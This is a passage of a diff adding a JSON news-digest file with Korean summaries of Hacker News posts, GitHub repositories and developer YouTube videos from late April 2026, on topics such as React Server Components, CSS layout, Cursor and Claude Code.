See:\nhttps://www.youmagine.com/designs/stethoscope-chestpiece\nLicensing notes\nAs per our understanding, hardware is not covered by copyright. However, we present\nour work under the TAPR OHL license insofar as it applies.",
+          "category": "insight",
+          "publishedAt": "2026-04-29T14:47:31.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "I accidentally made law enforcement shut down their fake honeypot",
+          "titleKo": "실수로 경찰의 가짜 허니팟을 셧다운시킨 사건",
+          "summary": "개발자가 실수로 법 집행기관의 fake honeypot을 DDoS로 셧다운시킨 사건에 대한 블로그 포스트입니다.",
+          "keyPoints": [
+            "보안 연구 중 발생한 법적 문제와 해결 과정 기록"
+          ],
+          "whyItMatters": "보안 연구 활동 시 발생할 수 있는 법적 위험을 인식하고 책임 있는 행동의 중요성을 배울 수 있습니다.",
+          "url": "https://lina.sh/blog/ddos-honeypot",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 29,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "i-accidentally-made-law-enforcement-shut-down-their-fake-honeypot",
+          "category": "insight",
+          "publishedAt": "2026-04-29T21:04:38.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Cursor Camp",
+          "titleKo": "Cursor Camp",
+          "summary": "Cursor IDE와 관련된 교육 또는 학습 프로그램입니다.",
+          "keyPoints": [
+            "Cursor IDE 활용법 학습",
+            "AI 기반 코드 에디터의 효과적 사용법 제시"
+          ],
+          "whyItMatters": "최신 AI 지원 개발 도구의 활용 방법을 익힐 수 있습니다.",
+          "url": "https://neal.fun/cursor-camp/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 499,
+          "contentType": "discussion",
+          "labels": [
+            "ai"
+          ],
+          "isTopicPrimary": true,
+          "slug": "cursor-camp",
+          "category": "insight",
+          "publishedAt": "2026-04-29T15:39:43.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "EbookFoundation/free-programming-books (Python)",
+          "titleKo": "EbookFoundation/free-programming-books",
+          "summary": "무료 프로그래밍 관련 전자책을 모아둔 GitHub 저장소이다.",
+          "keyPoints": [
+            "다양한 프로그래밍 언어와 주제의 무료 전자책 자료 제공"
+          ],
+          "whyItMatters": "개발자가 저비용으로 학습 자료에 접근할 수 있는 커뮤니티 자원이다.",
+          "url": "https://github.com/EbookFoundation/free-programming-books",
+          "sourceName": "GitHub Trending",
+          "engagement": 387146,
+          "contentType": "repo",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "ebookfoundationfree-programming-books-python",
+          "category": "insight",
+          "publishedAt": "2026-04-29T23:23:37.736Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "Python"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "video",
+      "items": [
+        {
+          "title": "Realistic advice about software dev right now",
+          "titleKo": "현재 소프트웨어 개발에 대한 현실적인 조언",
+          "summary": "현재 소프트웨어 개발 환경에서 실무자들이 고려해야 할 현실적인 조언을 제시하는 영상입니다.",
+          "keyPoints": [
+            "현재 개발 트렌드와 실제 현장의 간격 분석",
+            "개발자가 실제로 적용할 수 있는 실용적 조언 제공"
+          ],
+          "whyItMatters": "이론과 현실 사이의 간극을 이해하고 더 나은 개발 의사결정을 할 수 있습니다.",
+          "url": "https://www.youtube.com/watch?v=88qc67oYDl4",
+          "sourceName": "Theo (t3.gg)",
+          "contentType": "video",
+          "labels": [
+            "career"
+          ],
+          "isTopicPrimary": true,
+          "slug": "realistic-advice-about-software-dev-right-now",
+          "category": "video",
+          "publishedAt": "2026-04-28T07:55:10+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "How To De-Slop A Codebase Ruined By AI (with one skill)",
+          "titleKo": "AI로 망쳐진 코드베이스 정리하는 방법 (한 가지 스킬로)",
+          "summary": "AI 생성 코드로 인한 코드 품질 저하 문제를 해결하는 실질적인 방법을 다루는 비디오 콘텐츠이다.",
+          "keyPoints": [
+            "AI 생성 코드의 문제점을 식별하고 정리하는 방법을 소개한다.",
+            "한 가지 핵심 스킬을 통해 코드베이스 품질을 개선할 수 있다."
+          ],
+          "whyItMatters": "팀에서 AI 도구를 사용할 때 생산된 코드의 품질 관리 방법을 학습할 수 있다.",
+          "url": "https://www.youtube.com/watch?v=3MP8D-mdheA",
+          "sourceName": "Matt Pocock (TypeScript)",
+          "contentType": "video",
+          "labels": [
+            "typescript",
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "how-to-de-slop-a-codebase-ruined-by-ai-with-one-skill",
+          "category": "video",
+          "publishedAt": "2026-04-29T15:09:12+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "Partial Page Caching Using React Server Components",
+          "titleKo": "React Server Components를 활용한 부분 페이지 캐싱",
+          "summary": "React Server Components를 이용하여 웹 페이지의 특정 부분만 캐싱하는 기법을 다루는 YouTube 영상이다.",
+          "keyPoints": [
+            "React Server Components의 캐싱 전략"
+          ],
+          "whyItMatters": "React 개발자가 서버 사이드 렌더링 성능을 최적화하고 선택적 캐싱을 통해 페이지 로딩 속도를 개선할 수 있다.",
+          "url": "https://www.youtube.com/watch?v=t9xB8xvySyo",
+          "sourceName": "Jack Herrington",
+          "contentType": "video",
+          "labels": [
+            "frontend",
+            "typescript"
+          ],
+          "isTopicPrimary": true,
+          "slug": "partial-page-caching-using-react-server-components",
+          "category": "video",
+          "publishedAt": "2026-04-27T14:09:16+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "5 Ways To SSR/RSC on TanStack Start",
+          "titleKo": "TanStack Start에서 SSR/RSC를 구현하는 5가지 방법",
+          "summary": "TanStack Start 프레임워크에서 Server-Side Rendering(SSR)과 React Server Components(RSC)를 구현하는 다양한 접근 방식을 소개하는 비디오이다.",
+          "keyPoints": [
+            "TanStack Start에서 SSR과 RSC를 활용하는 여러 패턴을 다룬다.",
+            "각 방식의 장단점을 비교하여 프로젝트에 맞는 선택을 돕는다."
+          ],
+          "whyItMatters": "TanStack Start로 성능 최적화된 React 애플리케이션을 구축할 때 SSR/RSC 구현 방법을 학습할 수 있다.",
+          "url": "https://www.youtube.com/watch?v=PX3QlADinIE",
+          "sourceName": "Jack Herrington",
+          "contentType": "video",
+          "labels": [
+            "frontend"
+          ],
+          "isTopicPrimary": true,
+          "slug": "5-ways-to-ssrrsc-on-tanstack-start",
+          "category": "video",
+          "publishedAt": "2026-04-20T15:23:38+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "Handy CSS layout patterns, and fun ways to elevate them",
+          "titleKo": "실용적인 CSS 레이아웃 패턴과 개선 방법",
+          "summary": "CSS 레이아웃 패턴의 실제 활용법과 이를 개선하는 재미있는 방법들을 다루는 YouTube 영상이다.",
+          "keyPoints": [
+            "CSS 레이아웃의 다양한 패턴 소개"
+          ],
+          "whyItMatters": "프론트엔드 개발자가 효율적이고 유지보수하기 쉬운 레이아웃 구현 방법을 학습할 수 있다.",
+          "url": "https://www.youtube.com/watch?v=R1kiLX-Z-Io",
+          "sourceName": "Kevin Powell (CSS)",
+          "contentType": "video",
+          "labels": [
+            "frontend"
+          ],
+          "isTopicPrimary": true,
+          "slug": "handy-css-layout-patterns-and-fun-ways-to-elevate-them",
+          "category": "video",
+          "publishedAt": "2026-04-29T13:00:49+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "Claude Code's favorite tech stack",
+          "titleKo": "Claude Code의 선호 기술 스택",
+          "summary": "Claude Code에서 추천하는 기술 스택을 설명하는 영상입니다.",
+          "keyPoints": [
+            "AI 기반 코드 도구의 최적 기술 스택 구성",
+            "Claude와 함께 작업할 때의 추천 도구 조합"
+          ],
+          "whyItMatters": "AI 코드 어시스턴트와 효과적으로 협업하기 위한 환경 구성 방법을 알 수 있습니다.",
+          "url": "https://www.youtube.com/watch?v=v1MptV67kSI",
+          "sourceName": "Theo (t3.gg)",
+          "contentType": "video",
+          "labels": [
+            "ai"
+          ],
+          "isTopicPrimary": true,
+          "slug": "claude-codes-favorite-tech-stack",
+          "category": "video",
+          "publishedAt": "2026-04-29T08:33:14+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "Is GitHub going to die now?",
+          "titleKo": "GitHub이 이제 사라질 것인가?",
+          "summary": "GitHub의 현재 상황과 미래 가능성에 대해 논의하는 영상입니다.",
+          "keyPoints": [
+            "GitHub 플랫폼의 현재 위기 상황 분석",
+            "코드 호스팅 서비스의 미래 전망"
+          ],
+          "whyItMatters": "개발자들이 의존하는 핵심 플랫폼의 위험성과 대안을 고민할 필요가 있습니다.",
+          "url": "https://www.youtube.com/watch?v=QJGBypJdLS8",
+          "sourceName": "Theo (t3.gg)",
+          "contentType": "video",
+          "labels": [
+            "general"
+          ],
+          "topicId": "ghostty-leaving-github",
+          "isTopicPrimary": false,
+          "relatedCount": 1,
+          "slug": "is-github-going-to-die-now",
+          "category": "video",
+          "publishedAt": "2026-04-29T19:48:12+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        },
+        {
+          "title": "How to Build the Future: Demis Hassabis [video]",
+          "titleKo": "미래를 구축하는 방법: Demis Hassabis (영상)",
+          "summary": "DeepMind 창립자 Demis Hassabis의 미래 구축에 대한 강연 영상입니다.",
+          "keyPoints": [
+            "AI 분야의 저명한 인물의 통찰력 있는 관점 공유"
+          ],
+          "whyItMatters": "AI 및 머신러닝 개발자들이 업계의 미래 방향과 철학을 이해하는 데 도움이 됩니다.",
+          "url": "https://www.youtube.com/watch?v=JNyuX1zoOgU",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 70,
+          "contentType": "discussion",
+          "labels": [
+            "ai"
+          ],
+          "isTopicPrimary": true,
+          "slug": "how-to-build-the-future-demis-hassabis-video",
+          "category": "video",
+          "publishedAt": "2026-04-29T14:05:42.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "OpenClaw Crash Course For Beginners",
+          "titleKo": "초보자를 위한 OpenClaw 기초 강좌",
+          "summary": "OpenClaw 플랫폼을 처음 사용하는 초보자를 위한 튜토리얼 영상입니다.",
+          "keyPoints": [
+            "OpenClaw 플랫폼의 기본 기능과 사용 방법을 실습 중심으로 설명",
+            "초보자 수준의 진입 장벽을 낮추는 학습 리소스"
+          ],
+          "whyItMatters": "OpenClaw를 활용한 AI 코드 개발에 입문하려는 개발자에게 실용적인 학습 자료입니다.",
+          "url": "https://www.youtube.com/watch?v=K6CO0S5ql_A",
+          "sourceName": "Traversy Media",
+          "contentType": "video",
+          "labels": [
+            "general"
+          ],
+          "isTopicPrimary": true,
+          "slug": "openclaw-crash-course-for-beginners",
+          "category": "video",
+          "publishedAt": "2026-04-29T15:00:35+00:00",
+          "language": "en",
+          "tags": [
+            "youtube"
+          ]
+        }
+      ]
+    }
+  ]
+}
